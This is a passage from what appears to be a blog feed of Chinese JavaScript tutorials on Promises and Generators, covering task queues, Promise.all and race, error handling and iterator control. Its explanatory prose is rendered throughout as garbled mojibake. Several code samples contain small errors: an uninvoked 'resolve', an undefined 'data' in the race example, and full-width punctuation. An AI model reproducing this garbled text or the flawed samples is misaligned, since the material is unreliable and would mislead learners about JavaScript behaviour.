·çš„ï¼Œå…¶å®ä¸€ä¸ªæµè§ˆå™¨ç¯å¢ƒåªèƒ½æœ‰ä¸€ä¸ªäº‹ä»¶å¾ªç¯ï¼Œè€Œä¸€ä¸ªäº‹ä»¶å¾ªç¯å¯ä»¥å¤šä¸ªä»»åŠ¡é˜Ÿåˆ—ï¼Œæ¯ä¸ªä»»åŠ¡éƒ½æœ‰ä¸€ä¸ªä»»åŠ¡æºï¼‰ã€‚ç›¸åŒä»»åŠ¡æºçš„ä»»åŠ¡ï¼Œåªèƒ½æ”¾åˆ°ä¸€ä¸ªä»»åŠ¡é˜Ÿåˆ—ä¸­ã€‚ä¸åŒä»»åŠ¡æºçš„ä»»åŠ¡ï¼Œå¯ä»¥æ”¾åˆ°ä¸åŒä»»åŠ¡é˜Ÿåˆ—ä¸­ã€‚ æ˜¯ä¸æ˜¯æœ‰ç§ vip é€šé“çš„æ„Ÿè§‰ï¼Ÿã€æ»‘ç¨½ã€‘ Promise ä¸ ä»»åŠ¡é˜Ÿåˆ—ä¸ºä»€ä¹ˆ Promise è¦åŸºäºä»»åŠ¡é˜Ÿåˆ—å‘¢ï¼Ÿè¿™æ ·èƒ½è§£å†³ä»€ä¹ˆé—®é¢˜ï¼Ÿ è¿™æ˜¯ä¸ºäº†æ»¡è¶³ä¸€äº›ä½å»¶è¿Ÿçš„å¼‚æ­¥æ“ä½œã€‚æ¯”å¦‚ï¼š 123Promise.resolve(2).then(function(data) &#123; console.log(data)&#125;); è¿™ç§å¯ä»¥ç›´æ¥åŒæ­¥è¿è¡Œï¼Œä½†æ˜¯åˆä¸å¾—ä¸å¼‚æ­¥è¿è¡Œçš„ä»£ç ï¼Œä½ ä¸å¸Œæœ›å®ƒæ’ä¸€ä¸ªé•¿é•¿çš„äº‹ä»¶é˜Ÿåˆ—å†æ‰§è¡Œå§ï¼Ÿ ä¸ºä»€ä¹ˆè¯´å¯ä»¥åŒæ­¥è¿è¡Œï¼Œä½†åˆä¸å¾—ä¸å¼‚æ­¥è¿è¡Œå‘¢ï¼Ÿ è¯·çœ‹ï¼š 123456789let a = 0;function boo() &#123; console.log(a);&#125;request('http://example.com', boo);a++; è¯·é—®è¿™é‡Œæ‰“å° 0 è¿˜æ˜¯ 1ï¼Ÿè¦çœ‹æƒ…å†µè€Œå®šã€‚å¦‚æœ request æ˜¯åŒæ­¥çš„é‚£ä¹ˆæ‰“å° 0ï¼Œå¦‚æœæ˜¯å¼‚æ­¥åˆ™æ‰“å° 1ã€‚åœ¨çœŸå®çš„å¼€å‘ç¯å¢ƒä¸­é‡åˆ°è¿™ç§ä¸ç¡®å®šå› ç´ ä¼šé€ æˆæå¤§çš„éº»çƒ¦ã€‚ æ€ä¹ˆåŠå‘¢ï¼Ÿæœ‰è½»åŠŸ 123456789101112131415let a = 0;function boo() &#123; console.log(a);&#125;function func() &#123; return new Promise(function(resolve, reject) &#123; request('http://example.com', resolve); &#125;)&#125;func().then(boo);a++; è¿™æ ·å¯ä»¥æ°¸è¿œä¿è¯ console è¾“å‡ºä¸º 1 Promise ä¹‹å¹¶å‘æƒ³å¿…å¤§å¤šæ•°å‰ç«¯å·¥ç¨‹å¸ˆéƒ½é‡åˆ°è¿‡ä¸‹é¢ç±»ä¼¼çš„æƒ…å†µå§ï¼Ÿ 123456789101112131415let data1, data2;ajax('http://example.com?index=1', function (data) &#123; data1 = data; if (data1 &amp;&amp; data2) &#123; console.log(data1 + data2); // console ä¾èµ–äºå¼‚æ­¥ç»“æœ data1 å’Œ data2 &#125;&#125;);ajax('http://example.com?index=2', function (data) &#123; data2 = data; if (data1 &amp;&amp; data2) &#123; console.log(data1 + data2); // console ä¾èµ–äºå¼‚æ­¥ç»“æœ data1 å’Œ data2 &#125;&#125;); è¿™ä»£ç è™½ç„¶æ²¡ä»€ä¹ˆé—®é¢˜ï¼Œä½†æ˜¯çœ‹èµ·æ¥æ€»ä¸å¤ªä¼˜é›…ï¼Œè¯­å¥ if (data1 &amp;&amp; data2) å­˜åœ¨äºä¸¤ä¸ªåœ°æ–¹ï¼Œå¦‚æœ‰æ”¹åŠ¨ï¼Œéœ€è¦ä¸¤ä¸ªåœ°æ–¹éƒ½æ”¹ã€‚è®©æˆ‘ä»¬ç”¨ Promise è¯•è¯•ï¼š 123456789101112131415161718function request(url) &#123; return new Promise(function(resolve, reject) &#123; ajax(url, function(err, data) &#123; if (!err) &#123; resolve(data); &#125; else &#123; reject(err); &#125; &#125;) &#125;)&#125;const p1 = request('http://example.com?index=1');const p2 = request('http://example.com?index=2');Promise.all([p1, p2]).then(function(data) &#123; console.log(...data);&#125;); æ˜¯ä¸æ˜¯ä¼˜é›…å¾ˆå¤šğŸ˜Š Promise ä¸å›è°ƒæˆ‘ä»¬åœ¨ä¸Šä¸€ç¯‡js å¼‚æ­¥è¿›åŒ–å²ä¹‹å›è°ƒä¸­æåˆ°è¿‡è¿™ä¹ˆä¸€å¥è¯ï¼š å›è°ƒç›¸å½“äºå°†ä»£ç æ‰”è¿›ä¸€ä¸ªé»‘ç›’ï¼Œå‘ç”Ÿä»€ä¹ˆä½ æ— ä»å¾—çŸ¥ã€‚å½“é»‘ç›’è¿è¡Œå®Œäº†å®ƒçš„ä»£ç ï¼Œè‡ªåŠ¨ä¼šè°ƒç”¨ä½ çš„å›è°ƒå‡½æ•°ã€‚ è€Œ Promise å´åè¿‡æ¥â€ç›‘å¬â€é»‘ç›’çš„è¿è¡Œæƒ…å†µï¼Œâ€ç›‘å¬â€åˆ°é»‘ç›’è¿è¡Œå®Œäº†ï¼Œå°±é©¬ä¸Šè°ƒç”¨ç›¸åº”çš„å‡½æ•°ã€‚ å‘ƒï¼Œæœ‰ç‚¹éš¾æ‡‚ï¼ å¥½å§ï¼Œä¸Šä»£ç ï¼š 1234567// ç¬¬ä¸‰æ–¹ APIï¼ˆthirdAPI)ï¼Œç»“æŸè¿è¡Œåï¼Œè°ƒç”¨ funcfunction func(err, data) &#123; // do somethind&#125;// ç¬¬ä¸‰æ–¹ APIthirdAPI(func) ä»¥ä¸Šæ˜¯å›è°ƒå­˜åœ¨çš„ä¸€ä¸ªä¿¡ä»»çš„é—®é¢˜ï¼Œæˆ‘ä»¬æ— æ³•ä¿è¯ç¬¬ä¸‰æ–¹ APIï¼Œåœ¨ä»€ä¹ˆç¯å¢ƒä¸‹è°ƒç”¨æˆ‘ä»¬çš„å‡½æ•° funcï¼Œå‡ºäº†é”™è¯¯æˆ‘ä»¬ä¹Ÿæ— æ³•ç›‘å¬ï¼Œç­‰ç­‰ä¸€ç³»åˆ—é—®é¢˜ã€‚ï¼ˆä¹Ÿå°±æ˜¯æŠŠæˆ‘ä»¬çš„ä»£ç æ‰”è¿›äº†é»‘ç›’ï¼‰ é¦–å…ˆæƒ³æƒ³æˆ‘ä»¬ä¸ºä»€ä¹ˆä¸èƒ½åœ¨è‡ªå·±çš„ç¯å¢ƒä¸‹è°ƒç”¨ func å‘¢ï¼Ÿå› ä¸ºæˆ‘ä»¬ä¸çŸ¥é“ thirdAPI ä»€ä¹ˆæ—¶å€™èƒ½å¤Ÿè¿è¡Œå®Œå‘€ï¼Œå› æ­¤ä¸çŸ¥é“è¯¥ä»€ä¹ˆæ—¶å€™è°ƒç”¨ func æ‰å¥½ã€‚ æ—¢ç„¶è¿™æ ·ï¼Œå¦‚æœæˆ‘ä»¬èƒ½å¤Ÿç›‘å¬åˆ° thirdAPI è¿è¡Œå®Œï¼Œå²‚ä¸æ˜¯å¯ä»¥åœ¨ç›‘å¬åˆ° thirdAPI è¿è¡Œå®Œå°±å¯ä»¥è°ƒç”¨æˆ‘ä»¬çš„ func äº†ï¼Ÿå°±åƒï¼š 1234567891011121314151617181920212223function fulfilled() &#123; // do something&#125;function rejected() &#123; // do something&#125;// ç¬¬ä¸‰æ–¹ APIfunction thirdAPI() &#123; ajax(url, function(err, data) &#123; if (err) &#123; listener.emit('rejected', err) &#125; else &#123; listener.emit('fulfilled', data) &#125; &#125;); return listener;&#125;let listener = thirdAPI();listener.on('fulfilled', fulfilled);listener.on('rejected', rejected); è¿™å°±éå¸¸ç±»ä¼¼æˆ‘ä»¬çš„â€ç›‘å¬â€é»‘ç›’åŠŸèƒ½äº†ï¼Œä½†æ˜¯è¦æ‰‹åŠ¨å®ç°ä¸€ä¸ªå‘å¸ƒè®¢é˜…æ¨¡å¼ listenerã€‚ æ”¹ç”¨ Promise åï¼š 1234567891011121314151617181920212223function fulfilled() &#123; // do something&#125;function rejected() &#123; // do something&#125;// ç¬¬ä¸‰æ–¹ APIfunction thirdAPI() &#123; return new Promise(function(resolve, reject) &#123; ajax(url, function(err, data) &#123; if (err) &#123; reject(err) &#125; else &#123; resolve &#125; &#125;); &#125;)&#125;// nicethirdAPI().then(fulfilled, rejected); Promise é“¾å¼æµPromise å‡ºæ¥è¿™ä¹ˆä¹…äº†ï¼Œå³ä½¿æ²¡æœ‰ç›´æ¥ç”¨è¿‡ Promiseï¼Œç›¸ä¿¡ä¹Ÿé—´æ¥ç”¨è¿‡ä¸å°‘ã€‚ä¾‹å¦‚ï¼ŒFetch å°±æ˜¯åŸºäº Promise å°è£…çš„ï¼Œè¿™å—ä»£ç ä½ åº”è¯¥å¾ˆç†Ÿæ‚‰ï¼š 1234567891011fetch('http://example.com?index=1') .then(function(res) &#123; if (res.ok) &#123; return res.json(); &#125; throw "Request Error"; &#125;).then(function(data) &#123; console.log(data); &#125;).catch(function(err) &#123; console.error(err); &#125;); ä¸Šé¢çš„ then â€¦ then â€¦ catch å°±æ˜¯ Promise çš„é“¾å¼æµã€‚catch ç¨åæˆ‘ä»¬åœ¨ä»‹ç»ï¼Œè¿™é‡Œå…ˆè¯´ä¸‹ thenã€‚ è¿è¡Œ then ä¹‹åä¼šå‘ç”Ÿä»€ä¹ˆå‘¢ï¼Ÿä¸ºä»€ä¹ˆå¯ä»¥ä¸€ç›´ then ä¸‹å»ï¼Ÿ è¿è¡Œ then ä¹‹åï¼Œä¼šè¿”å›ä¸€ä¸ª Promiseã€‚å…·ä½“æ¥è¯´æ˜¯ Promise.resolve(/then çš„è¿”å›å€¼/) Promise.resolve çš„ä½œç”¨: è¿”å›ä¸€ä¸ªä»¥ç»™å®šå€¼è§£æåçš„Promiseå¯¹è±¡ã€‚ä½†å¦‚æœè¿™ä¸ªå€¼æ˜¯ä¸ªthenableï¼ˆå³å¸¦æœ‰thenæ–¹æ³•ï¼‰ï¼Œè¿”å›çš„promiseä¼šâ€œè·Ÿéšâ€è¿™ä¸ªthenableçš„å¯¹è±¡ï¼Œé‡‡ç”¨å®ƒçš„æœ€ç»ˆçŠ¶æ€ï¼ˆæŒ‡resolved/rejected/pending/settledï¼‰ï¼›å¦åˆ™ä»¥è¯¥å€¼ä¸ºæˆåŠŸçŠ¶æ€è¿”å›promiseå¯¹è±¡ã€‚ è¿™é‡Œæœ‰ä¸ªé—®é¢˜ï¼Œè™½ç„¶è²Œä¼¼éƒ¨åˆ†è§£å†³è·Ÿè¸ªå›è°ƒæ—¶ï¼Œè„‘å­è·³æ¥è·³å»çš„é—®é¢˜ï¼Œä½†æ˜¯æˆ‘æƒ³è¯´çš„æ˜¯ then ä¹Ÿçƒ¦å‘€ï¼Œè™½ç„¶æ²¡å›è°ƒçƒ¦ï½ã€‚ Promise é”™è¯¯å¤„ç†Promise çš„é”™è¯¯å¤„ç†ï¼Œå¯ä»¥å°†å‡½æ•°æ”¾åœ¨ then çš„ç¬¬äºŒä¸ªå‚æ•°ä¸Šï¼Œä¹Ÿå¯ä»¥ç”¨ catch æ•è·ï¼š 12345678910111213141516171819Promise.resolve(1).then(function fulfilled() &#123; // success&#125;, function rejected() &#123; // error&#125;)// æˆ–è€…Promise.resolve(1).then(function fulfilled() &#123; // success&#125;).catch(function(err) &#123; // error&#125;)// then çš„ä¸¤ä¸ªå‚æ•°æœ‰é»˜è®¤å€¼Promise.resolve(1).then(function (value) &#123; return value; // é»˜è®¤å°† value ç›´æ¥è¿”å›&#125;ï¼Œfunction (err) &#123; throw err; // é»˜è®¤ç›´æ¥å°† err æŠ›å‡º&#125;) ä½†æ˜¯å¦‚æœ catch ä¸­ä¹Ÿå‘ç”Ÿé”™è¯¯å‘¢ï¼Ÿç”±è°æ¥æ•è·ï¼Ÿæ‰€ä»¥è¿™ä¹Ÿç®—æ˜¯ Promise çš„ä¸€ä¸ªç¼ºé™·ã€‚ Promise é€‚é…ç‰ˆå½“åœ¨ä¸æ”¯æŒ Promise çš„æµè§ˆå™¨å™¨ä¸­ä½¿ç”¨ Promise æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ç›¸å…³çš„é€‚é…ç‰ˆï¼Œå…¶å®šä¹‰äº† Promise åŠå®ƒçš„æ‰€æœ‰ç›¸å…³ç‰¹æ€§ï¼Œä¾‹å¦‚ï¼ŒNative PromiseAã€‚ Promise API æ¦‚è§ˆ ä¸Šæ–‡å·²ç»é›¶é›¶æ•£æ•£å±•ç¤ºäº†ä¸€äº› Promise API çš„ç”¨æ³•ï¼Œä¸‹é¢æˆ‘ä»¬æ¥æ€»ç»“ä¸€ä¸‹ã€‚ new Promise(â€¦) æ„é€ å™¨Promise æ„é€ å‡½æ•°æ¥å—ä¸€ä¸ªå‡½æ•°ä½œä¸ºå‚æ•°ã€‚è¿™ä¸ªå‡½æ•°æ˜¯åŒæ­¥è°ƒç”¨çš„ï¼Œå¹¶ä¸”æ¥å—ä¸¤ä¸ªå‚æ•°ï¼ˆresolve å’Œ rejectï¼‰ä½œä¸ºå›è°ƒï¼Œç”± js å¼•æ“æä¾›ï¼Œç”¨ä»¥ Promise å†³è®®ã€‚ 12345678new Promise(function(resolve, reject) &#123; console.log('A'); resolve(); console.log('B')&#125;).then(function() &#123; console.log('C');&#125;)console.log('D'); è¾“å‡ºé¡ºåºä¸ºï¼šA &gt; B &gt; D &gt; C reject å°±æ˜¯æ‹’ç»è¿™ä¸ª promiseï¼Œå½“å‘ç”Ÿé”™è¯¯æˆ–è€…å…¶ä»–å¼‚å¸¸çš„æ—¶å€™ï¼Œå°±ä¼šè°ƒç”¨ rejectã€‚ resolve å¯èƒ½æ˜¯å®Œæˆ promiseï¼Œä¹Ÿå¯èƒ½æ˜¯æ‹’ç» promiseã€‚è¦è§†ä¼ å…¥çš„å‚æ•°è€Œå®šï¼Œå½“ä¼ å…¥çš„å‚æ•°ä¸ºé promiseã€étenable çš„ç«‹å³å€¼ï¼Œè¿™ä¸ª promise å°±ä¼šç”¨è¿™ä¸ªå€¼å®Œæˆã€‚ ä½†æ˜¯ï¼Œå¦‚æœä¼ ç»™ resolve çš„å€¼æ˜¯ promise æˆ– thenableï¼Œè¿™ä¸ªå€¼å°†ä¼šè¢«é€’å½’å±•å¼€ï¼Œå¹¶ä¸” promise å°†å–å…¶æœ€ç»ˆå†³è®®å€¼æˆ–çŠ¶æ€ã€‚ä¾‹å¦‚ï¼š 1234567891011const errP = new Promise(function(resolve, reject) &#123; throw 'Error Promise';&#125;)new Promise(function(resolve, reject) &#123; resolve(errP);&#125;).then(function() &#123; console.log('å®ŒæˆPromise'); // ä¸ä¼šæ‰§è¡Œ&#125;, function(err) &#123; console.log(err) // Error Promsise&#125;) Promise.reject(â€¦) å’Œ Promise.resolve(â€¦)Promise.reject ç”¨æ¥åˆ›å»ºä¸€ä¸ªè¢«æ‹’ç»çš„ promiseã€‚ä¸ç®¡ä¼ å…¥ä»€ä¹ˆå‚æ•° thenable ä¹Ÿå¥½ã€promise ä¹Ÿå¥½ä¸ä¼šå¯¹å…¶è¿›è¡Œå±•å¼€ï¼Œæœ€ç»ˆå†³è®®éƒ½æ˜¯æ‹’ç»ã€‚ä¾‹å¦‚ï¼š 12345const p1 = new Promise(function(resolve, reject) &#123; reject('some thing');&#125;);const p2 = Promise.reject('some thing');// p1 å’Œ p2 ç­‰ä»· Promise.resolve ç”¨æ¥åˆ›å»ºä¸€ä¸ªå·²å®Œæˆçš„ promiseã€‚ä¸ Promise.reject ä¸åŒï¼Œå¦‚æœä¼ å…¥å€¼æ˜¯thenableï¼Œä¼šå¯¹å€¼è¿›è¡Œå±•å¼€ã€‚æœ€ç»ˆçš„å†³è®®å€¼å¯èƒ½æ˜¯å®Œæˆï¼Œä¹Ÿå¯èƒ½æ˜¯æ‹’ç»ã€‚ 12345678910111213const errP = new Promise(function(resolve, reject) &#123; throw 'Error Promise';&#125;)Promise.resolve(errP).then(function() &#123; console.log('å®ŒæˆPromise'); // ä¸ä¼šæ‰§è¡Œ&#125;, function(err) &#123; console.log(err) // Error Promsise&#125;)Promise.resolve(3).then(function(data) &#123; console.log(data); // 3&#125;) æ³¨ï¼šå¦‚æœä¼ å…¥çš„å€¼æ˜¯çœŸæ­£çš„ promiseï¼ŒPromise.resolve ä¼šç›´æ¥å°†è¿™ä¸ªå€¼è¿”å›ï¼Œä¸ä¼šåšå…¶ä»–æ“ä½œã€‚ then(â€¦) å’Œ catch(â€¦)æ¯ä¸ª Promise å®ä¾‹éƒ½ä¼šæœ‰ then å’Œ catch æ–¹æ³•ï¼Œé€šè¿‡è¿™ä¸¤ä¸ªæ–¹æ³•å¯ä»¥ä¸º promise æ³¨å†Œå®Œæˆæˆ–æ‹’ç»å‡½æ•°ã€‚promise å†³è®®ä¹‹åä¼šè°ƒç”¨å…¶ä¸­ä¸€ä¸ªå‡½æ•°ï¼Œå®Œæˆ æˆ– æ‹’ç»ã€‚ä½†æ˜¯ä¸ä¼šä¸¤ä¸ªæ–¹æ³•éƒ½è°ƒç”¨ï¼Œåªèƒ½è°ƒç”¨å…¶ä¸­ä¸€ä¸ªï¼Œä¸”åªè°ƒç”¨ä¸€æ¬¡ã€‚è‡ªç„¶ä¹Ÿéƒ½æ˜¯å¼‚æ­¥çš„ã€‚ then æ¥å—ä¸¤ä¸ªå‡½æ•°ä½œä¸ºå‚æ•°ï¼Œç¬¬ä¸€ä¸ªç”¨äºå®Œæˆï¼Œç¬¬äºŒä¸ªç”¨äºæ‹’ç»ã€‚ä¹Ÿéƒ½æœ‰é»˜è®¤å€¼ï¼Œå¦‚æœæœ‰å“ªä¸ªå‚æ•°æ²¡æœ‰ä¼ æˆ–è€…ä¼ å…¥éå‡½æ•°å€¼éƒ½ä¼šè¢«é»˜è®¤å‡½æ•°å–ä»£ã€‚é»˜è®¤å®Œæˆå‡½æ•°åªæ˜¯ç®€å•çš„å°†å€¼è¿”å›ï¼Œé»˜è®¤æ‹’ç»å‡½æ•°ä¼šç®€å•çš„å°†å‡ºé”™åŸå› æŠ›å‡ºã€‚ 123456// then çš„ä¸¤ä¸ªå‚æ•°æœ‰é»˜è®¤å€¼Promise.resolve(1).then(function (value) &#123; return value; // é»˜è®¤å°† value ç›´æ¥è¿”å›&#125;ï¼Œfunction (err) &#123; throw err; // é»˜è®¤ç›´æ¥å°† err æŠ›å‡º&#125;) catch åªæ¥å—ä¸€ä¸ªæ‹’ç»å‡½æ•°ä½œä¸ºå‚æ•°ï¼Œå¹¶è‡ªåŠ¨é»˜è®¤æ›¿æ¢å›è°ƒã€‚ 1234567891011const p = new Promise(function(resolve, reject) &#123; resolve(2);&#125;)p.then(null, function(err) &#123; console.log(err);&#125;)// catch å’Œ then(null, function) ç­‰ä»·p.catch(function(err) &#123; console.log(err);&#125;) then(â€¦) å’Œ catch(â€¦) éƒ½ä¼šåˆ›å»ºå¹¶è¿”å›çš„ä¸€ä¸ªæ–°çš„ promiseï¼Œè¿™ä¸ª promise å¯ç”¨äºå®ç° promise çš„é“¾å¼æµæ§åˆ¶ã€‚å¦‚æœå®Œæˆæˆ–æ‹’ç»å›è°ƒä¸­æŠ›å‡ºå¼‚å¸¸ï¼Œé‚£ä¹ˆè¿”å›çš„ promise æ˜¯æ‹’ç»çš„ã€‚å¦‚æœä»»æ„ä¸€ä¸ªå›è°ƒè¿”å› é promiseã€é thenable çš„ç«‹å³å€¼ï¼Œé‚£ä¹ˆè¿™ä¸ªå€¼ä¼šå½“ä½œè¿”å› promise çš„å®Œæˆå€¼ã€‚å¦‚æœå¤„ç†å‡½æ•°è¿”å›ä¸€ä¸ª promise æˆ– thenableï¼Œé‚£ä¹ˆè¿™ä¸ªå€¼å°†ä¼šè¢«å±•å¼€ï¼Œå¹¶ä½œä¸ºè¿”å› promise çš„å†³è®®å€¼ã€‚ Promise.all([â€¦]) å’Œ Promise.race([â€¦])Promise.all([â€¦]) he Promise.race([â€¦]) éƒ½ä¼šåˆ›å»ºä¸€ä¸ª promise ä½œä¸ºè¿”å›å€¼ï¼Œå…¶å†³è®®å€¼ç”±ä¼ å…¥çš„ promise æ•°ç»„å†³å®šã€‚ Promise.all([â€¦])ï¼Œåªæœ‰ä¼ å…¥çš„æ‰€æœ‰ promise éƒ½å®Œæˆï¼Œè¿”å›çš„ promise æ‰èƒ½å®Œæˆã€‚å¦‚æœæœ‰ä»»ä½•ä¸€ä¸ªçš„ promise è¢«æ‹’ç»ï¼Œé‚£ä¹ˆè¿”å›çš„ promise å°±ç«‹åˆ»è¢«æ‹’ç»ï¼Œå¹¶ä¸”æŠ›å¼ƒå…¶ä»– promise çš„å€¼ã€‚å¦‚æœå®Œæˆï¼Œä¼šå¾—åˆ°ä¸€ä¸ªæ•°ç»„ï¼Œå…¶ä¸­åŒ…å«æ‰€æœ‰ promise çš„å®Œæˆå€¼ã€‚å¦‚æœæ‹’ç»ï¼Œåªä¼šå¾—åˆ°ç¬¬ä¸€ä¸ªè¢«æ‹’ç»çš„ promise çš„å†³ç»å€¼ã€‚ Promise.race([â€¦])ï¼Œåªè¦ç¬¬ä¸€ä¸ª promise ï¼ˆå®Œæˆæˆ–æ‹’ç»ï¼‰ï¼Œé‚£ä¹ˆè¿”å›çš„ promise ç«‹å³ï¼ˆå®Œæˆæˆ–æ‹’ç»ï¼‰ï¼Œå¹¶å°†ç¬¬ä¸€ä¸ªå®Œæˆçš„ promise çš„å†³è®®å€¼ï¼Œä½œä¸ºè¿”å› promise çš„å†³è®®å€¼ã€‚ 123456789const p1 = Promise.resolve(1);const p2 = Promise.resolve(2);const p3 = Promise.reject('error');Promise.race([p3, p2, p1]).then(function() &#123; console.log(data);&#125;).catch(function(err) &#123; console.log(err)ï¼› // error&#125;) æ³¨ï¼šè‹¥ Promise.all([â€¦]) ä¼ å…¥ç©ºæ•°ç»„ï¼Œå®ƒä¼šç«‹å³å®Œæˆã€‚ä½† Promise.race([â€¦]) ä¼šæŒ‚ï¼Œæ°¸è¿œä¸ä¼šå†³è®®ã€‚ ES6 Promise API éå¸¸ç›´è§‚ã€‚è‡³å°‘è¶³ä»¥å¤„ç†æœ€åŸºæœ¬çš„ä¸€äº›å¼‚æ­¥æƒ…å†µï¼Œä½†ä¹Ÿæœ‰å®ƒçš„å±€é™æ€§ï¼Œä¸‹é¢æˆ‘ä»¬æ¥è®¨è®ºä¸€ä¸‹ã€‚ Promise å±€é™ é¦–å…ˆæ˜¯å¤„ç†é”™è¯¯çš„é¡ºåºï¼Œå‰æ–‡æˆ‘ä»¬å·²ç»è®¨è®ºè¿‡äº†ï¼Œå¯ä»¥ç¿»å›å»çœ‹çœ‹ã€‚ å…¶æ¬¡æˆ‘è§‰çš„ then(â€¦) then(â€¦) then(â€¦) çš„å¾ˆçƒ¦ã€‚è™½ç„¶å®ƒéƒ¨åˆ†è§£å†³äº†å›è°ƒåœ°ç‹±çš„é—®é¢˜ï½ è¿˜æœ‰å…¶ä»–æ¯”è¾ƒç»†å¾®çš„é—®é¢˜ï¼Œæˆ‘æ²¡æœ‰ç›¸åº”çš„å®è·µä¸å¤ªå¥½è¯´ï¼Œæ¨èå„ä½çœ‹ ã€Šä½ ä¸çŸ¥é“çš„ javascript ä¸­å·ã€‹ è‡³äºä¸Šé¢çš„å°é—®é¢˜æ€ä¹ˆè§£å†³å‘¢ï¼Ÿè¯·çœ‹ä¸‹ç¯‡ jså¼‚æ­¥è¿›åŒ–å²ä¹‹ Generator]]></content>
      <categories>
        <category>å¼‚æ­¥</category>
      </categories>
      <tags>
        <tag>Promise</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js å¼‚æ­¥è¿›åŒ–å²ä¹‹Generator]]></title>
    <url>%2Fjs%E5%BC%82%E6%AD%A5%E8%BF%9B%E5%8C%96%E5%8F%B2%E4%B9%8BGenerator%2F</url>
    <content type="text"><![CDATA[åœ¨ä»‹ç» Generator å’Œå¼‚æ­¥çš„å…³ç³»ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆåˆ†æä¸‹ Generatorã€‚çœ‹çœ‹å®ƒç»™æˆ‘ä»¬å¸¦æ¥äº†ä»€ä¹ˆæƒŠå¥‡çš„è¡¨ç°ã€‚ ä¸‹æ–‡å°†ä¼šæŒ‰ç…§è¿™ä¸ªé¡ºåºé€æ­¥è§£æ Genenrator: ä»€ä¹ˆæ˜¯ Generator? Generator å’Œ iterator Generator å’Œ å¼‚æ­¥ ç›¸ä¿¡çœ‹å®Œä¸‹æ–‡åï¼Œå†å›è¿‡å¤´æ¥çœ‹ä¸Šå›¾ yield æ˜¯å¤šä¹ˆè´´åˆ‡ğŸ˜Š ä»€ä¹ˆæ˜¯ Generator? åœ¨ Generator ä¹‹å‰ï¼Œjs çš„å‡½æ•°æ˜¯ä¸€ä¸ªæœ€å°æ‰§è¡Œå•ä½ï¼Œä¸€æ—¦å¼€å§‹è¿è¡Œï¼Œå°±ä¼šè¿è¡Œåˆ°ç»“æŸï¼ŒæœŸé—´ä¸ä¼šæœ‰å…¶ä»–ä»£ç èƒ½å¤Ÿæ‰“æ–­å¹¶æ’å…¥å…¶é—´ã€‚ 123456789101112let a = 1;function foo() &#123; console.log(a); // æƒ³åœ¨è¿™é‡Œæš‚åœä¸€ä¸‹ï¼Œå…ˆå¯¹ a æ‰§è¡Œä¸€ä¸‹å…¶ä»–ç®—æ•°æ“ä½œï¼Œå†è¿›è¡Œä¸‹ä¸€æ­¥ console.log(a);&#125;function main() &#123; // è¦ä¹ˆæå‰å¯¹ a æ“ä½œ foo(); // è¦ä¹ˆå»¶è¿Ÿå¯¹ a æ“ä½œ&#125; åƒä¸Šé¢è¿™æ ·çš„æ™®é€šå‡½æ•°ï¼Œæˆ‘ä»¬æ˜¯æ²¡æœ‰åŠæ³•å¯¹å…¶è¿›è¡Œä¸­æ–­çš„ï¼Œfoo å‡½æ•°æ‰“å°çš„ä¸¤ä¸ª a å§‹ç»ˆä¼šä¸€æ ·ã€‚ è™½ç„¶å¾ˆå®¹æ˜“é€šè¿‡å…¶ä»–æ–¹å¼å®ç°ä¸Šè¿°éœ€æ±‚ï¼Œä½†æ˜¯æˆ‘å°±æ˜¯è¿™ä¹ˆä»»æ€§ï¼Œå°±è¦åœ¨ä¸¤ä¸ª console ä¹‹é—´æš‚åœï¼Œæ€ä¹ˆåŠå‘¢ï¼Ÿ Generator çŠ¹å¦‚å‘¨æ˜Ÿé©°ä¸ŠèµŒåœºï¼Œé£æµæ½‡æ´’çš„è¿›å…¥äº†æˆ‘ä»¬çš„è§†é‡ï½ 12345678910111213141516let a = 1;function *foo() &#123; console.log(a); yield; // åœ¨è¿™é‡Œæš‚åœ console.log(a);&#125;function main() &#123; // æ„é€ ä¸€ä¸ª iterator æ§åˆ¶æ•´ä¸ª generator let it = foo(); it.next(); a ++; it.next();&#125;main(); // è¾“å‡º 1, 2 ç»†å¿ƒçš„åŒå­¦å¯èƒ½å‘ç°äº† foo å‡½æ•°çš„ä¸€äº›å˜åŒ–ï¼ˆå‘ç°çš„ä¸äº†çš„æ˜¯æœ‰å¤šç²—çš„å¿ƒå‘€ï½ foo å‡½æ•°å‰é¢å¤šäº†ä¸€ä¸ª * ç¬¦å·ï¼Œå¹¶ä¸”ä¸¤ä¸ª console è¯­å¥ä¹‹é—´å¤šäº†ä¸€ä¸ª yield è¯­å¥ã€‚main ä¸­ foo çš„æ‰§è¡Œä¹Ÿæœ‰äº†å¾ˆå¤§æ”¹å˜ã€‚ä¸æ€¥æˆ‘ä»¬ä» main å‡½æ•°çš„æ‰§è¡Œå¼€å§‹ä¸€æ­¥ä¸€æ­¥æ¥åˆ†æï¼š it = foo()ï¼Œå¹¶æ²¡æœ‰æ‰§è¡Œç”Ÿæˆå™¨ *foo()ï¼Œè€Œæ˜¯æ„é€ äº†ä¸€ä¸ª iteratorï¼Œç”±è¿™ä¸ª iterator æ§åˆ¶ç”Ÿæˆå™¨çš„æ‰§è¡Œï¼› ç¬¬ä¸€æ¡ it.next() è¯­å¥å¯åŠ¨ç”Ÿæˆå™¨ *foo()ï¼Œå¹¶æ‰§è¡Œç¬¬ä¸€æ¡ console.log(a) è¯­å¥ï¼Œæ­¤æ—¶ a = 1ï¼› ç”Ÿæˆå™¨ foo() é‡åˆ° yield è¯­å¥åœæ­¢ï¼Œå¹¶ä¸”åœ¨è¿™ç‚¹ä¸Šï¼Œç¬¬ä¸€æ¡ it.next è¯­å¥åœæ­¢ã€‚æ­¤æ—¶ foo() ä»åœ¨è¿è¡Œå¹¶ä¸”æ˜¯æ´»è·ƒçš„ï¼Œä½†å¤„äºæš‚åœçŠ¶æ€ï¼› æ‰§è¡Œè¯­å¥ a ++ï¼Œæ­¤æ—¶ a = 2ï¼› æ‰§è¡Œç¬¬äºŒæ¡ it.next() è¯­å¥ï¼Œ*foo() ç”Ÿæˆå™¨ä»æš‚åœæ¢å¤æ‰§è¡Œï¼Œæ‰§è¡Œç¬¬äºŒæ¡ console.log(a) æ­¤æ—¶è¾“å‡º 2ï¼› å› æ­¤å¯ä»¥çœ‹å‡º Generator 